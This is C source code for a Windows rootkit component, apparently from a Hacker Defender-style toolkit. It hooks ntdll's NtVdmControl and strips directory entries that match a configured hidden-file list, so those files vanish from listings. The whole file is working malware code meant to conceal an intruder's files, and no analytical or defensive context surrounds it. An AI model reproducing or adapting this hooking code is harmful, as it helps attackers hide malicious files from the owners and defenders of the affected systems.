#include <winsock2.h>
#include <windows.h>
#include <time.h>
#include "ntdll.h"

#include "config.h"

#include "ntquerydirectoryfile.h"
#include "ntvdmcontrol.h"

// ntdll.NtVdmControl
NTSTATUS WINAPI NewNtVdmControl(ULONG ControlCode,PVOID ControlData)
{
	NTSTATUS rc;
		
	// call original function
	rc=OldNtVdmControl(ControlCode,ControlData);

	if (NT_SUCCESS(rc)&&ControlCode==VdmDirectoryFile)
	{
		ULONG ulFileBufferLength=0;
		PVOID pFileBuffer=(PVOID)(((PVOID*)ControlData)[1]); 
		PVOID p=pFileBuffer,pLast=NULL;
		BOOL bLastOne;
		UNICODE_STRING usName;
		ANSI_STRING asName;

		// we dont want a null pointer :)
		if (!p) return rc;

		// get size of ControlData buffer
		while(getDirEntryLenToNext(p,FileBothDirectoryInformation))
		{
			ulFileBufferLength+=getDirEntryLenToNext(p,FileBothDirectoryInformation);
			p=((char*)p+getDirEntryLenToNext(p,FileBothDirectoryInformation));
		}
		
		// add last record
		ulFileBufferLength+=getDirEntryFileLength(p,FileBothDirectoryInformation);
		ulFileBufferLength+=0x5E;
		
		p=pFileBuffer;

		do 
		{
			bLastOne=!getDirEntryLenToNext(p,FileBothDirectoryInformation);
				
			if (getDirEntryFileLength(p,FileBothDirectoryInformation)) 
			{
				usName.Buffer=getDirEntryFileName(p,FileBothDirectoryInformation);
				usName.Length=(USHORT)getDirEntryFileLength(p,FileBothDirectoryInformation);
				RtlUnicodeStringToAnsiString(&asName,&usName,TRUE);
				if (config_CheckString(ConfigHiddenFileDir,asName.Buffer,asName.Length))
				{
               		RtlFreeAnsiString(&asName);
					if(bLastOne) 
					{
						if(p==pFileBuffer) rc=0x80000006;
						else setDirEntryLenToNext(pLast,FileBothDirectoryInformation,0);
						break;
					} 
					else 	
					{	
						int iPos=((ULONG)p)-(ULONG)pFileBuffer;
						int iLeft=(DWORD)ulFileBufferLength-iPos-getDirEntryLenToNext(p,FileBothDirectoryInformation);
						RtlCopyMemory(p,(PVOID)((char*)p+getDirEntryLenToNext(p,FileBothDirectoryInformation)),(DWORD)iLeft);
						continue;
					}
				}
				RtlFreeAnsiString(&asName);
			}
			
			pLast=p;
			p=((char*)p+getDirEntryLenToNext(p,FileBothDirectoryInformation));
		} 
		while(!bLastOne);
	}

	return rc;
}
